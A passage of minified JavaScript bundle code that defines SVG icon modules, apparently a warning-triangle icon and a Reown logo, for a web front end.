7.85774 2.7879C7.9014 2.7642 7.95029 2.75178 7.99997 2.75178C8.04964 2.75178 8.09854 2.7642 8.1422 2.7879C8.18586 2.8116 8.2229 2.84583 8.24997 2.88749L13.715 12.3794C13.7367 12.4143 13.7483 12.4546 13.7486 12.4958C13.7488 12.5369 13.7376 12.5773 13.7162 12.6125ZM7.24997 8.49999V6.49999C7.24997 6.30108 7.32898 6.11031 7.46964 5.96966C7.61029 5.82901 7.80105 5.74999 7.99997 5.74999C8.19888 5.74999 8.38964 5.82901 8.5303 5.96966C8.67095 6.11031 8.74997 6.30108 8.74997 6.49999V8.49999C8.74997 8.6989 8.67095 8.88967 8.5303 9.03032C8.38964 9.17097 8.19888 9.24999 7.99997 9.24999C7.80105 9.24999 7.61029 9.17097 7.46964 9.03032C7.32898 8.88967 7.24997 8.6989 7.24997 8.49999ZM8.99997 11C8.99997 11.1978 8.94132 11.3911 8.83144 11.5556C8.72155 11.72 8.56538 11.8482 8.38265 11.9239C8.19992 11.9996 7.99886 12.0194 7.80488 11.9808C7.6109 11.9422 7.43271 11.847 7.29286 11.7071C7.15301 11.5672 7.05777 11.3891 7.01918 11.1951C6.9806 11.0011 7.0004 10.8 7.07609 10.6173C7.15177 10.4346 7.27995 10.2784 7.4444 10.1685C7.60885 10.0586 7.80219 9.99999 7.99997 9.99999C8.26518 9.99999 8.51954 10.1053 8.70707 10.2929C8.89461 10.4804 8.99997 10.7348 8.99997 11Z" fill="currentColor"/>
</svg>
`,Xpt=Object.freeze(Object.defineProperty({__proto__:null,exclamationTriangleSvg:Qpt},Symbol.toStringTag,{value:"Module"})),e1t=xe`<svg width="60" height="16" viewBox="0 0 60 16" fill="none"">
  <path d="M9.3335 4.66667C9.3335 2.08934 11.4229 0 14.0002 0H20.6669C23.2442 0 25.3335 2.08934 25.3335 4.66667V11.3333C25.3335 13.9106 23.2442 16 20.6669 16H14.0002C11.4229 16 9.3335 13.9106 9.3335 11.3333V4.66667Z" fill="#363636"/>
  <path d="M15.6055 11.0003L17.9448 4.66699H18.6316L16.2923 11.0003H15.6055Z" fill="#F6F6F6"/>
  <path d="M0 4.33333C0 1.9401 1.9401 0 4.33333 0C6.72657 0 8.66669 1.9401 8.66669 4.33333V11.6667C8.66669 14.0599 6.72657 16 4.33333 16C1.9401 16 0 14.0599 0 11.6667V4.33333Z" fill="#363636"/>
  <path d="M3.9165 9.99934V9.16602H4.74983V9.99934H3.9165Z" fill="#F6F6F6"/>
  <path d="M26 8C26 3.58172 29.3517 0 33.4863 0H52.5137C56.6483 0 60 3.58172 60 8C60 12.4183 56.6483 16 52.5137 16H33.4863C29.3517 16 26 12.4183 26 8Z" fill="#363636"/>
  <path d="M49.3687 9.95834V6.26232H50.0213V6.81966C50.256 6.40899 50.7326 6.16699 51.2606 6.16699C52.0599 6.16699 52.6173 6.67299 52.6173 7.65566V9.95834H51.972V7.69234C51.972 7.04696 51.6053 6.70966 51.07 6.70966C50.4906 6.70966 50.0213 7.17168 50.0213 7.82433V9.95834H49.3687Z" fill="#F6F6F6"/>
  <path d="M45.2538 9.95773L44.5718 6.26172H45.1877L45.6717 9.31242L46.3098 7.30306H46.9184L47.5491 9.29041L48.0404 6.26172H48.6564L47.9744 9.95773H47.2411L46.6178 8.03641L45.9871 9.95773H45.2538Z" fill="#F6F6F6"/>
  <path d="M42.3709 10.0536C41.2489 10.0536 40.5889 9.21765 40.5889 8.1103C40.5889 7.01035 41.2489 6.16699 42.3709 6.16699C43.4929 6.16699 44.1529 7.01035 44.1529 8.1103C44.1529 9.21765 43.4929 10.0536 42.3709 10.0536ZM42.3709 9.51096C43.1775 9.51096 43.4856 8.82164 43.4856 8.10296C43.4856 7.39163 43.1775 6.70966 42.3709 6.70966C41.5642 6.70966 41.2562 7.39163 41.2562 8.10296C41.2562 8.82164 41.5642 9.51096 42.3709 9.51096Z" fill="#F6F6F6"/>
  <path d="M38.2805 10.0536C37.1952 10.0536 36.5132 9.22499 36.5132 8.1103C36.5132 7.00302 37.1952 6.16699 38.2805 6.16699C39.1972 6.16699 40.0038 6.68766 39.9159 8.27896H37.1805C37.2319 8.96103 37.5472 9.5183 38.2805 9.5183C38.7718 9.5183 39.0945 9.21765 39.2045 8.87299H39.8499C39.7472 9.48903 39.1679 10.0536 38.2805 10.0536ZM37.1952 7.78765H39.2852C39.2338 7.04696 38.8892 6.70232 38.2805 6.70232C37.6132 6.70232 37.2832 7.18635 37.1952 7.78765Z" fill="#F6F6F6"/>
  <path d="M33.3828 9.95773V6.26172H34.0501V6.88506C34.2848 6.47439 34.6882 6.26172 35.1061 6.26172H35.9935V6.88506H35.0548C34.4682 6.88506 34.0501 7.26638 34.0501 8.00706V9.95773H33.3828Z" fill="#F6F6F6"/>
</svg>`,t1t=Object.freeze(Object.defineProperty({__proto__:null,reownSvg:e1t},Symbol.toStringTag,{value:"Module"}));
